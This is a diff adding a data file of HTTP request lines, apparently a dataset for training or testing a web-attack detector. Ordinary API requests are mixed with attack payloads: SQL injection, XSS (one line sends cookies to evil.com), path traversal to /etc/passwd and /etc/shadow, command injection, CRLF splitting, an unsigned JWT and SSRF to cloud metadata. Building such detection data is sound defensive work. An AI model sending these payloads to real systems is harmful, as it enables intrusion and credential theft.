@@ -1,0 +1,41 @@
+request
+GET /api/users?page=1&limit=20 HTTP/1.1
+GET /api/products?category=books HTTP/1.1
+POST /api/login HTTP/1.1
+GET /dashboard HTTP/1.1
+GET /api/search?q=laptop HTTP/1.1
+GET /about HTTP/1.1
+GET /api/orders?status=complete HTTP/1.1
+POST /api/checkout HTTP/1.1
+GET /api/users/42 HTTP/1.1
+GET /api/reports/monthly HTTP/1.1
+"GET /login?user=admin' OR 1=1 -- &pass=x"
+"GET /search?q=' UNION SELECT username,password FROM users --"
+"POST /api/data?id=1; DROP TABLE users; --"
+"GET /api/users?id=1' AND 1=1 --"
+"GET /products?name=<script>alert('XSS')</script>"
+"POST /comment?body=<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
+"GET /page?redirect=javascript:alert(1)"
+"GET /api/data?callback=<img onerror=alert(1) src=x>"
+GET /files/../../../etc/passwd HTTP/1.1
+GET /download?file=....//....//etc/shadow
+GET /api/../../../windows/system32/config/sam
+GET /page?path=/var/log/../../../etc/passwd
+"GET /search?q=%27%20OR%201%3D1%20--%20"
+"POST /login?user=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E"
+"GET /api/exec?cmd=;cat%20/etc/passwd"
+"GET /data?input=%0d%0aContent-Length%3A%200%0d%0a%0d%0aHTTP/1.1%20200%20OK"
+"GET /api/v1/users?filter=1;EXEC+xp_cmdshell('dir')"
+"POST /api/query?sql=SELECT+*+FROM+information_schema.tables"
+"GET /admin?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0."
+"POST /api/import?url=http://169.254.169.254/latest/meta-data/"
+GET /api/products?sort=price HTTP/1.1
+POST /api/review HTTP/1.1
+GET /api/cart HTTP/1.1
+GET /api/notifications HTTP/1.1
+GET /api/feed HTTP/1.1
+POST /api/subscribe HTTP/1.1
+GET /api/health HTTP/1.1
+GET /api/trending HTTP/1.1
+POST /api/preferences HTTP/1.1
+GET /api/catalog?page=1 HTTP/1.1
